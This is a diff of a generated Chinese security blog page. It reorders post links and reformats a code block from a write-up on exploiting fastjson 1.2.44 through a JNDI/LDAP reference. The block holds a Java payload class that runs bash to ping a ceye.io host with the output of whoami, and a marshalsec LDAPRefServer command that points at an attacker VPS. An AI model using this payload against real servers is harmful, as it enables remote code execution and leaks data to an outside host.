@@ -270,19 +270,19 @@
         </a>
         
         <a  class=""
-           href="/2019/12/23/hello-world/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="Hello World">Hello World</span>
-            <span class="post-date" title="2019-12-23 08:34:16">2019/12/23</span>
-        </a>
-        
-        <a  class=""
            href="/2019/12/23/sqlmap%E5%9C%A8https%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E4%B8%80%E4%B8%AA%E9%94%99%E8%AF%AF/"
            data-tag=""
            data-author="" >
             <span class="post-title" title="sqlmap在https情况下的一个错误">sqlmap在https情况下的一个错误</span>
             <span class="post-date" title="2019-12-23 08:53:50">2019/12/23</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/12/23/%E7%BE%8E%E5%A5%B3/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="美女">美女</span>
+            <span class="post-date" title="2019-12-23 08:32:55">2019/12/23</span>
         </a>
         
         <a  class=""
@@ -294,11 +294,11 @@
         </a>
         
         <a  class=""
-           href="/2019/12/23/%E7%BE%8E%E5%A5%B3/"
+           href="/2019/12/23/hello-world/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="美女">美女</span>
-            <span class="post-date" title="2019-12-23 08:32:55">2019/12/23</span>
+            <span class="post-title" title="Hello World">Hello World</span>
+            <span class="post-date" title="2019-12-23 08:34:16">2019/12/23</span>
         </a>
         
     </nav>
@@ -368,7 +368,20 @@ centos：tomcat9 jdk 1.8 fastjson1.2.44<br>
 vps：tomcat9 jdk1.8_112<br>
 工具：marshalsec<br>
 LDAPTouchFile.java</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line">public class LDAPTouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt &#x3D; Runtime.getRuntime();</span><br><span class="line">            String[] commands &#x3D; &#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;ping -c 5 &#96;whoami&#96;.xxx.ceye.io&quot;&#125;;</span><br><span class="line">            Process pc &#x3D; rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            &#x2F;&#x2F; do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>import java.lang.Runtime;
+import java.lang.Process;
+public class LDAPTouchFile {
+    static {
+        try {
+            Runtime rt &#x3D; Runtime.getRuntime();
+            String[] commands &#x3D; {&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;ping -c 5 &#96;whoami&#96;.xxx.ceye.io&quot;};
+            Process pc &#x3D; rt.exec(commands);
+            pc.waitFor();
+        } catch (Exception e) {
+            &#x2F;&#x2F; do nothing
+        }
+    }
+}</code></pre>
 <p>#vps上执行监听<br>
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <a href="http://vps-ip/#LDAPTouchFile" target="_blank" rel="noopener">http://vps-ip/#LDAPTouchFile</a></p>
 <p>#测试<br>
